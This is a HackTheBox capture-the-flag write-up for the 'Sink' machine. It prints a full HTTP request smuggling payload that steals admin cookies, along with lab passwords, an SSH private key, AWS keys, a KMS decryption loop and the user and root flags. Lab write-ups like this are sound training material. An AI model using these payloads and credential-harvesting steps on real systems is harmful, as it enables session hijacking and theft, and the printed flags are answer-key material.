# Sink - HackTheBox
Linux, 50 Base Points, Insane

## Machine

![‏‏Sink.JPG](images/Sink.JPG)

## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding port ```22```, Using ```nmap -p-``` we found another two ports ```3000``` and ```5000```.

***User 1***: Using [HTTP request smuggling attack](https://portswigger.net/web-security/request-smuggling/exploiting) we steal the admin Cookies to port ```5000```, Using admin Cookies we can read the admin notes on port ```5000``` portal, we found there credentials of port ```3000``` which is [Gitea](https://gitea.io/en-us/) portal, On Gitea portal we found ```marcus``` user ```SSH``` private key on one of the commits.

***User 2***: Found ```AWS``` key on another commit, Using [list-secrets](https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/list-secrets.html) and [get-secret-value](https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/get-secret-value.html) ```AWS``` commands we found ```david``` user credentials.

***Root***: On ```david``` home directory we found an encrypted file which encrypted using the key, We can found the ```KMS``` keys using [list-keys](https://docs.aws.amazon.com/cli/latest/reference/kms/list-keys.html) command, Using each of ```KMS``` keys we found one of them work, Decrypt the file using the key and we found ```gzip``` file, extract it and we found  the ```root``` credentials.

![pwn.JPG](images/pwn.JPG)

## Sink Solution

### User 1

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Sink]
└──╼ $ nmap -sC -sV -oA nmap/Sink 10.10.10.225
# Nmap 7.80 scan initiated Sun May 23 01:42:00 2021 as: nmap -sC -sV -oA nmap/Sink 10.10.10.225
Nmap scan report for 10.10.10.225
Host is up (0.21s latency).
Not shown: 899 closed ports, 100 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 23 01:43:08 2021 -- 1 IP address (1 host up) scanned in 68.01 seconds

```

We can see only port 22 open, By running another scan using ```nmap -p- 10.10.10.225``` for all ports we can found another two ports ```3000,5000```.

Port ```3000``` contains the following website:

![port3000.JPG](images/port3000.JPG)

Which is [Gitea](https://gitea.io/en-us/) portal.

Port ```5000``` contains the following website:

![port5000.JPG](images/port5000.JPG)

By intercepting the response from port 5000 using [Burp](https://portswigger.net/burp) we can see the following response:
![response5000.JPG](images/response5000.JPG)

As we can see we got the header of ```Via: haproxy```.

By google searching, we can see the following article about [Exploiting HTTP request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling/exploiting) 

Before we start the HTTP Smuggling attack I recommend you to read about that on the link above and on the following link: [https://gist.github.com/ndavison/4c69a2c164b2125cd6685b7d5a3c135b](https://gist.github.com/ndavison/4c69a2c164b2125cd6685b7d5a3c135b).

Using ```Burp``` we can get the request of the comment:
![submit.JPG](images/submit.JPG)

The ```HTTP POST``` request of the comment is:
```HTTP
POST /comment HTTP/1.1
Host: sink.htb:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://sink.htb:5000
DNT: 1
Connection: close
Referer: http://sink.htb:5000/home
Cookie: session=eyJlbWFpbCI6ImV2eWF0YXJAaHRiLmxvY2FsIn0.YL_BDQ.1DN67TersnTrPmQITVIEiYbzKq4
Upgrade-Insecure-Requests: 1

msg=yourcomment
```

Following the article as mentioned before, The ```HTTP Smuggling``` should look like the following:
```HTTP
POST /comment HTTP/1.1
Host: sink.htb:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 540
Origin: http://sink.htb:5000
DNT: 1
Transfer-Encoding:chunked
Connection: keep-alive
Referer: http://sink.htb:5000/home
Cookie: session=eyJlbWFpbCI6ImV2eWF0YXJAaHRiLmxvY2FsIn0.YL_BDQ.1DN67TersnTrPmQITVIEiYbzKq4
Upgrade-Insecure-Requests: 1

0

POST /comment HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Origin: http://sink.htb:5000
DNT: 1
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImV2eWF0YXJAaHRiLmxvY2FsIn0.YL_BDQ.1DN67TersnTrPmQITVIEiYbzKq4
Upgrade-Insecure-Requests: 1

msg=
```

NOTE:
```Transfer-Encoding:chunked``` header contains vertical tab, We can get the character using the following methods:

1. ```python``` and [gedit](https://wiki.gnome.org/Apps/Gedit):
```python
python3 -c "print('\v')" > output
```
Then, open the output file using ```gedit```, Copy the character and paste it before ```chunked```.

2. Write the following ```Base64``` string ```Cwo=``` before ```chunked``` and then decode it in burp using ```Ctrl+Shift+B```.


After we insert the vertical tab the request will look like the following:
![httpsmug.JPG](images/httpsmug.JPG)


Since we provided the 2nd smuggled request, our goal is when the admin logs in the web app his ```HTTP``` request headers get tangled with our smuggled request and the smuggled request along with the admin's tangled request to show up as text in the comment!

Let's refresh the website and we can see the following comment:
![smugcomment.JPG](images/smugcomment.JPG)


Let's change the cookies and we can see now that we are logged in as admin:
![admin.JPG](images/admin.JPG)


By clicking on Notes we can see the follow:
![notes.JPG](images/notes.JPG)

1. Notes 1 contains: ```Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&zEx{4]zz```
2. Notes 2 contains: ```Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3```
3. Notes 3 contains: ```Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8<H6GK\{*L.fB3C```

If we are back again to port 3000 (Gitea) we can log in using the credentials from Note 2 ```(root:FaH@3L>Z3})zzfQ3)```, After we are logged in we can see the following:
![port3000root.JPG](images/port3000root.JPG)

By clicking on the following commit:
![ec2commit.JPG](images/ec2commit.JPG)

We can see the following content:
![sshpk.JPG](images/sshpk.JPG)

Let's try to save the ssh key above on file ```id_rsa```:
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Use it to log in as ```marcus``` user (which create the commit):
```console
─[✗]─[user@parrot]─[/hackthebox/Sink]
└──╼ $ssh -i id_rsa marcus@10.10.10.225
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Jun 2021 08:11:52 PM UTC

  System load:                      0.41
  Usage of /:                       38.3% of 17.59GB
  Memory usage:                     57%
  Swap usage:                       0%
  Processes:                        303
  Users logged in:                  0
  IPv4 address for br-85739d6e29c0: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.225
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:22a5

 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

79 updates can be installed immediately.
26 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jan 27 12:14:16 2021 from 10.10.14.14
marcus@sink:~$ cat user.txt 
b9cb136cab7a0bf4738060675efb338f
marcus@sink:~$ ls /home
david  git  marcus
```

And we get the user flag ```b9cb136cab7a0bf4738060675efb338f```.

### User 2

By look at the following commit [http://sink.htb:3000/root/Log_Management/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba](http://sink.htb:3000/root/Log_Management/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba)

We can see the following ```PHP``` file:
```php
<?php
require 'vendor/autoload.php';

use Aws\CloudWatchLogs\CloudWatchLogsClient;
use Aws\Exception\AwsException;

$client = new CloudWatchLogsClient([
	'region' => 'eu',
	'endpoint' => 'http://127.0.0.1:4566',
	'credentials' => [
		'key' => 'AKIAIUEN3QWCPSTEITJQ',
		'secret' => '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'
	],
	'version' => 'latest'
]);
try {
$client->createLogGroup(array(
	'logGroupName' => 'Chef_Events',
));
}
catch (AwsException $e) {
    echo $e->getMessage();
    echo "\n";
}
try {
$client->createLogStream([
	'logGroupName' => 'Chef_Events',
	'logStreamName' => '20201120'
]);
}catch (AwsException $e) {
    echo $e->getMessage();
    echo "\n";
}
?>
```

So we can see ```AWS``` keys, Let's configure it with [aws configure](https://docs.aws.amazon.com/cli/latest/reference/configure/) as follow:
```console
marcus@sink:/tmp$ aws configure
AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default output format [None]: 
```

```AWS``` contains [Secret Manager](https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html) which Secrets Manager enables you to replace hardcoded credentials in your code, including passwords, with an API call to Secrets Manager to retrieve the secret programmatically. 

To retrieve the secrets list we can use command [list-secrets](https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/list-secrets.html) as follow:
```console
marcus@sink:/tmp$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-nnEwi",
            "Name": "Jenkins Login",
            "Description": "Master Server to manage release cycle 1",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "31679494-8cfb-4dc1-9e61-42a5761d72d1": [
                    "AWSCURRENT"
                ]
            }
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-puoRL",
            "Name": "Sink Panel",
            "Description": "A panel to manage the resources in the devnode",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "99cb7f8e-0575-43fb-8949-a180d7bb6011": [
                    "AWSCURRENT"
                ]
            }
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-dxAXV",
            "Name": "Jira Support",
            "Description": "Manage customer issues",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "15c851ae-7e60-44a1-8c4c-700a5311f18f": [
                    "AWSCURRENT"
                ]
            }
        }
    ]
}
```

Next, to retrieve secret value we can use the command [get-secret-value](https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/get-secret-value.html) as follow:
```console
marcus@sink:/tmp$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-nnEwi"
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-nnEwi",
    "Name": "Jenkins Login",
    "VersionId": "31679494-8cfb-4dc1-9e61-42a5761d72d1",
    "SecretString": "{\"username\":\"john@sink.htb\",\"password\":\"R);\\)ShS99mZ~8j\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1623182479
}
marcus@sink:/tmp$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-puoRL"
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-puoRL",
    "Name": "Sink Panel",
    "VersionId": "99cb7f8e-0575-43fb-8949-a180d7bb6011",
    "SecretString": "{\"username\":\"albert@sink.htb\",\"password\":\"Welcome123!\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1623182479
}
marcus@sink:/tmp$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-dxAXV"
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-dxAXV",
    "Name": "Jira Support",
    "VersionId": "15c851ae-7e60-44a1-8c4c-700a5311f18f",
    "SecretString": "{\"username\":\"david@sink.htb\",\"password\":\"EALB=bcC=`a7f2#k\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1623182479
}
```

So as we can see we get 3 secrets, The third secret is ```david``` credentials ```david@sink.htb:EALB=bcC=`a7f2#k```
Let's use ```david``` password:
```console
marcus@sink:/tmp$ su david
Password: 
david@sink:/tmp$ whoami
david
```
And we get ```david``` user.

### Root

On ```david``` home directory we can see the following file:
```console
david@sink:~/Projects/Prod_Deployment$ ls
servers.enc
```

It looks like an encrypted file, We need to decrypt this file but we need to get a key for that.

We know about [aws kms](https://docs.aws.amazon.com/cli/latest/reference/kms/index.html) - AWS Key Management Service (AWS KMS) is an encryption/decryption and key management web service.

We need to decrypt the file which is probably encrypted using this API.

Before we can do it, Let's configure again the ```AWS``` to retrieve ```KMS``` keys as ```david``` user:
```console
david@sink:~/Projects/Prod_Deployment$ aws configure
AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default output format [None]: 

```

First, Let's get all ```KMS``` keys using [list-keys](https://docs.aws.amazon.com/cli/latest/reference/kms/list-keys.html) command:

```console
david@sink:~/Projects/Prod_Deployment$ aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
{
    "Keys": [
        {
            "KeyId": "0b539917-5eff-45b2-9fa1-e13f0d2c42ac",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac"
        },
        {
            "KeyId": "16754494-4333-4f77-ad4c-d0b73d799939",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939"
        },
        {
            "KeyId": "2378914f-ea22-47af-8b0c-8252ef09cd5f",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f"
        },
        {
            "KeyId": "2bf9c582-eed7-482f-bfb6-2e4e7eb88b78",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78"
        },
        {
            "KeyId": "53bb45ef-bf96-47b2-a423-74d9b89a297a",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a"
        },
        {
            "KeyId": "804125db-bdf1-465a-a058-07fc87c0fad0",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0"
        },
        {
            "KeyId": "837a2f6e-e64c-45bc-a7aa-efa56a550401",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401"
        },
        {
            "KeyId": "881df7e3-fb6f-4c7b-9195-7f210e79e525",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525"
        },
        {
            "KeyId": "c5217c17-5675-42f7-a6ec-b5aa9b9dbbde",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde"
        },
        {
            "KeyId": "f0579746-10c3-4fd1-b2ab-f312a5a0f3fc",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc"
        },
        {
            "KeyId": "f2358fef-e813-4c59-87c8-70e50f6d4f70",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70"
        }
    ]
}

```
Now, We can use [aws kms decrypt](https://docs.aws.amazon.com/cli/latest/reference/kms/decrypt.html) command with those keys.

Before that, Let's save all keys to file:
```console
david@sink:~/Projects/Prod_Deployment$ aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep "KeyId" | cut -d '"' -f4 > /tmp/kms_keys
david@sink:~/Projects/Prod_Deployment$ cat /tmp/kms_keys 
0b539917-5eff-45b2-9fa1-e13f0d2c42ac
16754494-4333-4f77-ad4c-d0b73d799939
2378914f-ea22-47af-8b0c-8252ef09cd5f
2bf9c582-eed7-482f-bfb6-2e4e7eb88b78
53bb45ef-bf96-47b2-a423-74d9b89a297a
804125db-bdf1-465a-a058-07fc87c0fad0
837a2f6e-e64c-45bc-a7aa-efa56a550401
881df7e3-fb6f-4c7b-9195-7f210e79e525
c5217c17-5675-42f7-a6ec-b5aa9b9dbbde
f0579746-10c3-4fd1-b2ab-f312a5a0f3fc
f2358fef-e813-4c59-87c8-70e50f6d4f70
```

Now, Let's use the following ```bash``` script to decrypt the file using each key from the keys above:
```bash
for key in $(cat /tmp/kms_keys);
do
    aws --endpoint-url="http://127.0.0.1:4566/" kms enable-key --key-id "${key}"
    aws kms decrypt \
        --ciphertext-blob "fileb:///home/david/Projects/Prod_Deployment/servers.enc" \
        --endpoint-url="http://127.0.0.1:4566/" \
        --key-id $key \
        --encryption-algorithm "RSAES_OAEP_SHA_256" \
        --output text \
        --query Plaintext  > $key.out 
done

```

Run it, and we get the following file that contains Base64:
```console
david@sink:/tmp$ cat 804125db-bdf1-465a-a058-07fc87c0fad0.out
H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=
```

By decode it we get:
```console
tmp$ cat 804125db-bdf1-465a-a058-07fc87c0fad0.out | base64 -d > out
david@sink:/tmp$ file out
out: gzip compressed data, from Unix, original size modulo 2^32 10240
```

It's ```gzip```, Let's extract it:
```console
david@sink:/tmp$ mv out out.gz
david@sink:/tmp$ gzip -d out.gz
david@sink:/tmp$ cat out
servers.yml0000644000000000000000000000021313774573563012010 0ustar  rootrootserver:
  listenaddr: ""
  port: 80
  hosts:
    - certs.sink.htb
    - vault.sink.htb
defaultuser:
  name: admin
  pass: _uezduQ!EY5AHfe2
A%ȡ�#e0�Xig00006�4000000000000000000000021113774574111011755 0ustar  rootroot0��A#):�K2
```

We can see the creds ```admin:_uezduQ!EY5AHfe2```, Let's try those creds using SSH with root user:
```console
┌─[evyatar@parrot]─[/hackthebox/Sink]
└──╼ $ ssh root@sink.htb
root@sink.htb's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Jun 2021 09:48:28 PM UTC

  System load:                      0.13
  Usage of /:                       38.1% of 17.59GB
  Memory usage:                     69%
  Swap usage:                       0%
  Processes:                        315
  Users logged in:                  1
  IPv4 address for br-85739d6e29c0: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.225
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:22a5


79 updates can be installed immediately.
26 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have new mail.
Last login: Mon Feb  1 10:35:07 2021
root@sink:~# cat root.txt 
f2216efd9b96335dd801c472025e66f2
root@sink:~# 

```

And we get the root flag ```f2216efd9b96335dd801c472025e66f2```.
